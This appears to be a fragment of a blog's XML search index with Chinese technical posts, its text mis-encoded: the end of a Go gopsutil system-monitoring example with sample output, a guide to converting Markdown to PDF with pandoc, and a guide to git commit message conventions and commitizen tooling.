process.NewProcess(614) pm, _ := p.MemoryPercent() pn, _ := p.Username() fmt.Println(pm) fmt.Println(pn) fmt.Println("Ë¥üËΩΩÁªüËÆ°:") pl, _ := load.Avg() fmt.Println(pl)&#125; ÊúÄÂêéÊâßË°åËøá‰ºöÁöÑÁªìÊûúÂ§ßÊ¶Ç‰∏∫ËøôÊ†∑:1234567891011121314151617181920CPUÁªüËÆ°:[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]ÂÜÖÂ≠òÁªüËÆ°:&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;Á£ÅÁõòÁî®ÈáèÂíåIOÁªüËÆ°:&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]map[]ÁΩëÁªúIOÁªüËÆ°:[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]ÂçèËÆÆÁªüËÆ°:[]ÈìæÊé•Áä∂ÊÄÅÁªüËÆ°:[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]ËøõÁ®ãÁªüËÆ°:[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]0rootË¥üËΩΩÁªüËÆ°:&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>gopsutils</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰ΩøÁî®pandocÂ∞ÜmarkdownÊñáÊ°£ËΩ¨Êç¢Êàêpdf]]></title>
    <url>%2F2017%2F01%2F19%2Fmarkdown-to-pdf%2F</url>
    <content type="text"><![CDATA[Âú®ÂÖ¨Âè∏ÂÅöÂÜÖÈÉ®ÂàÜ‰∫´ÁöÑÊó∂ÂÄôÂæÄÂæÄÁî®ppt, ÂÜôpptÁöÑËøáÁ®ã‰∏≠ÂæÄÂæÄËøòÊúâÊØîËæÉÂ§öÁöÑ‰ª£Á†ÅÁ§∫‰æã, ÈÄöÂ∏∏ÁöÑÂÅöÊ≥ïÂ∞±ÊòØÁõ¥Êé•Êà™Âõæ, ÂÖ∂ÂÆûËøôÂØπ‰ΩøÁî®ËÄÖÊù•ËØ¥ÊòØÂæà‰∏çÂèãÂ•ΩÁöÑ, ËÄåÊàë‰πãÂâç‰∏ÄÁõ¥‰ΩøÁî®markdownÂÜôÂçöÂÆ¢, ÊØîÂ¶ÇÊàëËøô‰∏™ÂçöÂÆ¢, Âõ†Ê≠§Â∞±ÊÉ≥‰ΩøÁî®MarkDownÊù•ÂÜôÂàÜ‰∫´ÁöÑÊñáÊ°£, ‰ΩÜÊòØMarkDownÁöÑÊñáÊ°£Âπ∂‰∏çÊñπ‰æøÂÜÖÈÉ®‰º†ÈòÖ, Âõ†Ê≠§ÊÉ≥Âà∞‰∫Ü‰∏Ä‰∏™ÈóÆÈ¢ò: ËÉΩÂê¶Áî®MarkDownÂÜô, ÁÑ∂ÂêéËΩ¨Êç¢ÊàêPDF, ÁªôÂêå‰∫ã‰ΩøÁî®Ôºü‰∫éÊòØÈóÆ‰∫Ü‰∏ãÂ∫¶Â®ò, ÊûúÁÑ∂ÊâæÂà∞‰∫Ü‰∏Ä‰∏™Â∑•ÂÖ∑: Pandoc, ‰ΩøÁî®‰∏ãÊù•ÊÑüËßâ‰∏çÈîô, Âú®Ê≠§ÂàÜ‰∫´‰∏Ä‰∏ã‰ΩøÁî®ÊñπÊ≥ï, ‰πüÊñπ‰æø‰ª•ÂêéËá™Â∑±Êü•ÈòÖ„ÄÇ ÁÆÄ‰ªãPandocÊòØ‰∏Ä‰∏™Áî®haskellÁºñÂÜôÁöÑÂºÄÊ∫êÊñáÊú¨ËΩ¨Êç¢Â∑•ÂÖ∑ÔºåÂ∞èÂ∑ßËøÖÈÄü‰∏îÊîØÊåÅÊ†ºÂºèÂπøÊ≥õÔºåÂ†™Áß∞ÊñáÊú¨ËΩ¨Êç¢Â∫îÁî®ÁöÑÁëûÂ£´ÂÜõÂàÄ„ÄÇÊîØÊåÅÂæàÂ§öÁßçËæìÂÖ•ËæìÂá∫ÔºåÊúâÂÖ≥PandocÂèØ‰ª•Âú®ÂÖ∂ÂÆòÁΩëËøõË°åËØ¶ÁªÜ‰∫ÜËß£„ÄÇ‰∏ãËΩΩÈ°µÈù¢ÂèØ‰ª•ÁÇπÊ≠§ËøõÂÖ•ÔºåÂú®ÂÖ∂‰∏≠ÈÄâÊã©ÂêàÈÄÇÁöÑÁâàÊú¨Âç≥ÂèØÔºàGitHub‰∏ãËΩΩ‰∏çÂ§öËµòËø∞), Ëá≥‰∫éËØ¶ÁªÜÁöÑÊèèËø∞ËØ∑Áúãgithub‰∏äÁöÑËØ¥Êòé„ÄÇÊàëËøôÈáå‰∏ªË¶Å‰ΩøÁî® markdown‚Äî-&gt;pdf„ÄÇ ÂÆâË£ÖÊàëËøôÈáå‰ªÖ‰ªãÁªçMac‰∏ãÁöÑÂÆâË£Ö, ÈúÄË¶ÅÂÆâË£ÖpandocÂíåLaTeXÂÖ∂‰ªñÂπ≥Âè∞ÂÆòÊñπÊúâËØ¶Â∞ΩÁöÑ‰ªãÁªç, ÂÖ∑‰ΩìËØ∑Êü•ÁúãÔºöpandocÂÆòÊñπÂÆâË£ÖÊñáÊ°£ pandocÂÆâË£Ö1$ brew install pandoc LaTeXÂÆâË£ÖÂõ†‰∏∫ÊàëÈúÄË¶ÅËΩ¨Êç¢Êàêpdf,ËøòÈúÄË¶ÅË£ÖLaTeX, ÈÄâ‰∏Ä‰∏™BasicÁâàÊú¨ÁöÑÂÆâË£ÖÂç≥ÂèØ, LaTeXÁöÑ‰∏ãËΩΩÂú∞ÂùÄ ‰ΩøÁî®ÁÆÄÂçïÁöÑ‰ΩøÁî®ÂèØ‰ª•1$ pandoc -h ËØ¶ÁªÜÁî®Ê≥ïÂèØ‰ª•manÊü•ÁúãÔºåÊàëËøôÈáåÁõ¥Êé•ÁªôÂπ≤Ê¥ª‰∫Ü,Êàë‰ΩøÁî®Â∫ûÊàø,ËøôÈáåËÆ∞ÂæóÈÄâ‰∏ÄÁßç‰Ω†Á≥ªÁªü‰∏äÊúâÁöÑÂ≠ó‰Ωì„ÄÇ1pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown -o Keystone.pdf Ê≥®ÊÑè‰∫ãÈ°π‰∏ªË¶ÅÊòØPandocÈªòËÆ§ÊòØÂØπmarkDownËØ≠Ê≥ïÊúâÊâ©Â±ïÔºåÂ¶ÇÊûúÈÅáÂà∞ËΩ¨Êç¢ÂêéÁöÑÊïàÊûúÂíåÈ¢ÑÊúüÊïàÊûú‰∏ç‰∏ÄÊ†∑, ËøòÂæóÈòÖËØªPandocÊâ©Â±ïÁöÑMarkDownËØ≠Ê≥ï, ËøôÁØáÂçöÂÆ¢ÂØπÊ¨°‰ªãÁªç‰∏çÈîôPandoc‰∏≠ÁöÑmarkdownËØ≠Ê≥ïÊàëËøôÈáå‰ªÖÂàó‰∏æ‰∏Ä‰∏™ÊàëÈÅáÂà∞ÁöÑÂùëÔºåÂΩìÁÑ∂Â¶ÇÊûú‰Ω†ÊÉ≥‰ΩøÁî®Ê†áÂáÜÁöÑMarkDownËØ≠Ê≥ïÔºå‰πüÂèØ-f markdown_strict„ÄÇ ÂõæÁâá‰ΩçÁΩÆÂØπÂ∫î‰∏ç‰∏äÂú®markDown‰∏≠ÊèíÂÖ•ÁöÑÂõæÁâáÂíåMarkdownÈáåÁöÑ‰∏ç‰∏ÄÊ†∑, ËøôÈáåÈúÄË¶ÅÂú®ÂõæÁâáÂêéÈù¢Ê∑ªÂä†‰∏Ä‰∏™\, ËøôÊ†∑ÂõæÁâáÊâç‰∏ç‰ºöÊç¢Ë°å, Ëøô‰∏™Âú®ÂÆÉÊâ©Â±ïËØ≠Ê≥ï‰∏≠ÊúâÊèèËø∞„ÄÇ]]></content>
      <categories>
        <category>ÊñáÊ°£Â∑•ÂÖ∑</category>
        <category>pandoc</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[commit messageÁºñÂÜôËßÑËåÉ]]></title>
    <url>%2F2017%2F01%2F17%2Fcommit-message-style%2F</url>
    <content type="text"><![CDATA[GitÊØèÊ¨°Êèê‰∫§‰ª£Á†ÅÔºåÈÉΩË¶ÅÂÜôCommit message(Êèê‰∫§ËØ¥Êòé)ÔºåÂê¶ÂàôÂ∞±‰∏çÂÖÅËÆ∏Êèê‰∫§, Commit messageÂæÄÂæÄ‰ºöÁî®‰∫éÁîüÊàêChange logÊñáÊ°£, ËßÑËåÉÁöÑCommit messageÊòØ‰∏Ä‰∏™È´òË¥®ÈáèÈ°πÁõÆÂü∫Êú¨Ë¶ÅÊ±Ç„ÄÇÁ§æÂå∫ÊúâÂ§öÁßçCommit messageÁöÑÂÜôÊ≥ïËßÑËåÉ„ÄÇÂÖ∂‰∏≠‰ª•ÂõΩÈôÖÁü•ÂêçÈ°πÁõÆAngularJSÁöÑËßÑËåÉ‰ΩøÁî®ÊúÄ‰∏∫ÂπøÊ≥õ, Âõ†‰∏∫ÂÖ∂ÊØîËæÉÂêàÁêÜÂíåÁ≥ªÁªüÂåñ,Âπ∂‰∏îÊúâÁõ∏Â∫îÁöÑÈÖçÂ•óÂ∑•ÂÖ∑„ÄÇ ‰ΩúÁî®Ê†ºÂºèÂåñÂæóCommit messageÊúâÂæàÂ§öÂ•ΩÂ§Ñ Êèê‰æõÊõ¥Â§öÁöÑÂéÜÂè≤‰ø°ÊÅØÔºåÊñπ‰æøÂø´ÈÄüÊµèËßà 1234567$ git log &lt;last tag&gt; HEAD --pretty=format:%sÊ∑ªÂä†testcaseÊ∑ªÂä†ignoreÊ†ºÂºèÊ∑ªÂä†py2ÊîØÊåÅË°•ÂÖÖentry_pointsÊ∑ªÂä†ÊµãËØïÁéØÂ¢ÉÊñá‰ª∂Ê∑ªÂä†toxÊµãËØïÁõ∏ÂÖ≥Êñá‰ª∂ ÂèØ‰ª•ËøáÊª§Êüê‰∫õcommitÔºàÊØîÂ¶ÇÊñáÊ°£ÊîπÂä®ÔºâÔºå‰æø‰∫éÂø´ÈÄüÊü•Êâæ‰ø°ÊÅØ 123456789101112131415git log HEAD --grep 'Ê∑ªÂä†'commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0Merge: 5fcae1d f5c5120Author: Á¥´Â∑ùÁßÄ &lt;719118794@qq.com&gt;Date: Mon Jan 9 19:13:47 2017 +0800 Merge pull request #1 from huang75961/master Ê∑ªÂä†toxÊµãËØïcommit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5Author: hc &lt;409438984@qq.com&gt;Date: Mon Jan 9 19:00:32 2017 +0800 Ê∑ªÂä†testcase ÂèØ‰ª•Áõ¥Êé•‰ªécommitÁîüÊàêChange log Ëøô‰∏™ÈúÄË¶ÅÈÖçÂêàÂêéÈù¢ÁöÑÂ∑•ÂÖ∑‰ΩøÁî® ËßÑËåÉÊØèÊ¨°Êèê‰∫§ÔºåCommit message ÈÉΩÂåÖÊã¨‰∏â‰∏™ÈÉ®ÂàÜÔºöHeaderÔºåBody Âíå Footer„ÄÇ12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&lt;body&gt;&lt;footer&gt; ÂÖ∂‰∏≠ÔºåHeader ÊòØÂøÖÈúÄÁöÑÔºåBody Âíå Footer ÂèØ‰ª•ÁúÅÁï•„ÄÇ‰∏çÁÆ°ÊòØÂì™‰∏Ä‰∏™ÈÉ®ÂàÜÔºå‰ªª‰Ωï‰∏ÄË°åÈÉΩ‰∏çÂæóË∂ÖËøá72‰∏™Â≠óÁ¨¶ÔºàÊàñ100‰∏™Â≠óÁ¨¶Ôºâ„ÄÇËøôÊòØ‰∏∫‰∫ÜÈÅøÂÖçËá™Âä®Êç¢Ë°åÂΩ±ÂìçÁæéËßÇ„ÄÇ HeaderHeaderÈÉ®ÂàÜÂè™Êúâ‰∏ÄË°åÔºåÂåÖÊã¨‰∏â‰∏™Â≠óÊÆµÔºötypeÔºàÂøÖÈúÄÔºâ„ÄÅscopeÔºàÂèØÈÄâÔºâÂíåsubjectÔºàÂøÖÈúÄÔºâ„ÄÇ typeÁî®‰∫éËØ¥ÊòécommitÁöÑÁ±ªÂà´ÔºåÂè™ÂÖÅËÆ∏‰ΩøÁî®‰∏ãÈù¢7‰∏™Ê†áËØÜ featÔºöÊñ∞ÂäüËÉΩÔºàfeatureÔºâ fixÔºö‰øÆË°•bug docsÔºöÊñáÊ°£ÔºàdocumentationÔºâ styleÔºö Ê†ºÂºèÔºà‰∏çÂΩ±Âìç‰ª£Á†ÅËøêË°åÁöÑÂèòÂä®Ôºâ refactorÔºöÈáçÊûÑÔºàÂç≥‰∏çÊòØÊñ∞Â¢ûÂäüËÉΩÔºå‰πü‰∏çÊòØ‰øÆÊîπbugÁöÑ‰ª£Á†ÅÂèòÂä®Ôºâ testÔºöÂ¢ûÂä†ÊµãËØï choreÔºöÊûÑÂª∫ËøáÁ®ãÊàñËæÖÂä©Â∑•ÂÖ∑ÁöÑÂèòÂä® Â¶ÇÊûútype‰∏∫featÂíåfixÔºåÂàôËØ•commitÂ∞ÜËÇØÂÆöÂá∫Áé∞Âú®Change log‰πã‰∏≠„ÄÇÂÖ∂‰ªñÊÉÖÂÜµÔºàdocs„ÄÅchore„ÄÅstyle„ÄÅrefactor„ÄÅtestÔºâÁî±‰Ω†ÂÜ≥ÂÆöÔºåË¶Å‰∏çË¶ÅÊîæÂÖ•Change logÔºåÂª∫ËÆÆÊòØ‰∏çË¶Å„ÄÇ scopescopeÁî®‰∫éËØ¥Êòé commit ÂΩ±ÂìçÁöÑËåÉÂõ¥ÔºåÊØîÂ¶ÇÊï∞ÊçÆÂ±Ç„ÄÅÊéßÂà∂Â±Ç„ÄÅËßÜÂõæÂ±ÇÁ≠âÁ≠âÔºåËßÜÈ°πÁõÆ‰∏çÂêåËÄå‰∏çÂêå subjectsubjectÊòØ commit ÁõÆÁöÑÁöÑÁÆÄÁü≠ÊèèËø∞Ôºå‰∏çË∂ÖËøá50‰∏™Â≠óÁ¨¶„ÄÇ ‰ª•Âä®ËØçÂºÄÂ§¥Ôºå‰ΩøÁî®Á¨¨‰∏Ä‰∫∫Áß∞Áé∞Âú®Êó∂ÔºåÊØîÂ¶ÇchangeÔºåËÄå‰∏çÊòØchangedÊàñchanges Á¨¨‰∏Ä‰∏™Â≠óÊØçÂ∞èÂÜô ÁªìÂ∞æ‰∏çÂä†Âè•Âè∑Ôºà.Ôºâ BodyBody ÈÉ®ÂàÜÊòØÂØπÊú¨Ê¨° commit ÁöÑËØ¶ÁªÜÊèèËø∞ÔºåÂèØ‰ª•ÂàÜÊàêÂ§öË°å„ÄÇ‰ΩÜÊòØÊúâ‰∏§‰∏™Ê≥®ÊÑèÁÇπ„ÄÇ ‰ΩøÁî®Á¨¨‰∏Ä‰∫∫Áß∞Áé∞Âú®Êó∂ÔºåÊØîÂ¶Ç‰ΩøÁî®changeËÄå‰∏çÊòØchangedÊàñchanges„ÄÇ Â∫îËØ•ËØ¥Êòé‰ª£Á†ÅÂèòÂä®ÁöÑÂä®Êú∫Ôºå‰ª•Âèä‰∏é‰ª•ÂâçË°å‰∏∫ÁöÑÂØπÊØî„ÄÇ‰∏ãÈù¢ÊòØ‰∏Ä‰∏™angularÈ°πÁõÆ‰∏ãÈù¢ÁöÑ‰∏Ä‰∏™ËåÉ‰æã„ÄÇ1234567891011Protractor users were having a problem where if they had asynchonous code in a`route.resolve` or `route.resolveRedirectTo` variable, Protractor was notwaiting for that code to complete before continuing. Seeangular/protractor#789 (comment) fordetails.This commit fixes it by ensuring that `$browser#outstandingRequestCount` isproperly increased/decreased while `$route` (asynchronously) processes a route.Also, enhanced `ngMock` to wait for pending requests, before calling callbacksfrom `$browser.notifyWhenNoOutstandingRequests()`. FooterËØ•ÈÉ®ÂàÜ‰∏ªË¶ÅÊòØÁî®‰∫éÂèòÊõ¥Ëøá‰ºöÁöÑ‰∏Ä‰∫õÂêéÁª≠Êìç‰ΩúÁöÑ, ÊØîÂ¶ÇÂÖ≥Èó≠issue, Êí§ÈîÄ‰πãÂâçÁöÑcommitÁ≠â ÂÖ≥Èó≠IssueÂ¶ÇÊûúÂΩìÂâç commit ÈíàÂØπÊüê‰∏™issueÔºåÈÇ£‰πàÂèØ‰ª•Âú® Footer ÈÉ®ÂàÜÂÖ≥Èó≠Ëøô‰∏™ issue „ÄÇ‰πüÂèØ‰ª•‰∏ÄÊ¨°ÂÖ≥Èó≠Â§ö‰∏™issue 1Closes #112 1Closes #221, 222, 223 Êí§ÈîÄ‰πãÂâçÁöÑcommitÂ¶ÇÊûúÂΩìÂâç commit Áî®‰∫éÊí§ÈîÄ‰ª•ÂâçÁöÑ commitÔºåÂàôÂøÖÈ°ª‰ª•revert:ÂºÄÂ§¥ÔºåÂêéÈù¢Ë∑üÁùÄË¢´Êí§ÈîÄ Commit ÁöÑ Header„ÄÇBodyÈÉ®ÂàÜÁöÑÊ†ºÂºèÊòØÂõ∫ÂÆöÁöÑÔºåÂøÖÈ°ªÂÜôÊàêThis reverts commit hash.ÔºåÂÖ∂‰∏≠ÁöÑhashÊòØË¢´Êí§ÈîÄ commit ÁöÑ SHA Ê†áËØÜÁ¨¶„ÄÇÂ¶ÇÊûúÂΩìÂâç commit ‰∏éË¢´Êí§ÈîÄÁöÑ commitÔºåÂú®Âêå‰∏Ä‰∏™ÂèëÂ∏ÉÔºàreleaseÔºâÈáåÈù¢ÔºåÈÇ£‰πàÂÆÉ‰ª¨ÈÉΩ‰∏ç‰ºöÂá∫Áé∞Âú® Change log ÈáåÈù¢„ÄÇÂ¶ÇÊûú‰∏§ËÄÖÂú®‰∏çÂêåÁöÑÂèëÂ∏ÉÔºåÈÇ£‰πàÂΩìÂâç commitÔºå‰ºöÂá∫Áé∞Âú® Change log ÁöÑRevertsÂ∞èÊ†áÈ¢ò‰∏ãÈù¢„ÄÇ123revert: feat(pencil): add 'graphiteWidth' optionThis reverts commit 667ecc1654a317a13331b17617d973392f415f02. ‰∏çÂÖºÂÆπÂèòÂä®Â¶ÇÊûúÂΩìÂâç‰ª£Á†Å‰∏é‰∏ä‰∏Ä‰∏™ÁâàÊú¨‰∏çÂÖºÂÆπÔºåÂàô Footer ÈÉ®ÂàÜ‰ª•BREAKING CHANGEÂºÄÂ§¥ÔºåÂêéÈù¢ÊòØÂØπÂèòÂä®ÁöÑÊèèËø∞„ÄÅ‰ª•ÂèäÂèòÂä®ÁêÜÁî±ÂíåËøÅÁßªÊñπÊ≥ï„ÄÇ1234567891011121314151617BREAKING CHANGE: isolate scope bindings definition has changed. To migrate the code follow the example below: Before: scope: &#123; myAttr: 'attribute', &#125; After: scope: &#123; myAttr: '@', &#125; The removed `inject` wasn't generaly useful for directives so there should be no code using it. Â∑•ÂÖ∑Âü∫‰∫écommit messageÊúâ‰∏∞ÂØåÁöÑÂ∑•ÂÖ∑ÔºåÂåÖÊã¨ÁºñËæëÂô®ÔºåÊ†°È™åÂ∑•ÂÖ∑Ôºå‰ª•ÂèäÁîüÊàêChange logÁöÑÂ∑•ÂÖ∑ CommitizenÁºñËæëÂ∑•ÂÖ∑CommitizenÊòØ‰∏Ä‰∏™Êí∞ÂÜôÂêàÊ†º Commit message ÁöÑÂ∑•ÂÖ∑, ËØ¶ÁªÜËØ¥ÊòégithubÂú∞ÂùÄ ÂÆâË£Ö1) ÂÖ®Â±ÄÂÆâË£Ö(ËÆ∞Âæó‰ΩøÁî®Ê∑òÂÆùÊ∫êÊù•Âä†ÈÄü)123‚ûú ~ npm install -g commitizen‚ûú ~ npm install -g cz-conventional-changelogecho '&#123; "path": "cz-conventional-changelog" &#125;' &gt; ~/.czrc 2ÔºâÂ±ÄÈÉ®ÂÆâË£Ö12‚ûú ~ npm install commitizen -g‚ûú ~ commitizen init cz-conventional-changelog --save-dev --save-exact ‰∏ªË¶ÅÂ¶ÇÊûúÊä•package.json‰∏çÂ≠òÂú®,ÈúÄË¶ÅÊ∑ªÂä†Ëøô‰∏™Êñá‰ª∂, ËøôÊòØnodejsÁöÑÂåÖÁÆ°ÁêÜÊñá‰ª∂, Ê†ºÂºèÂèØ‰ª•ÂèÇÊï∞commitizenÂåÖÁöÑpackage.json ‰ΩøÁî®123456789101112131415‚ûú device git:(master) ‚úó git czcz-cli@2.9.5, cz-conventional-changelog@1.2.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you're committing: (Use arrow keys)‚ùØ feat: A new feature fix: A bug fix docs: Documentation only changes style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc) refactor: A code change that neither fixes a bug nor adds a feature perf: A code change that improves performance test: Adding missing tests or correcting existing tests(Move up and down to reveal more choices) validate-commit-msgÊ†°È™åÂ∑•ÂÖ∑validate-commit-msg Áî®‰∫éÊ£ÄÊü• Node È°πÁõÆÁöÑ Commit message 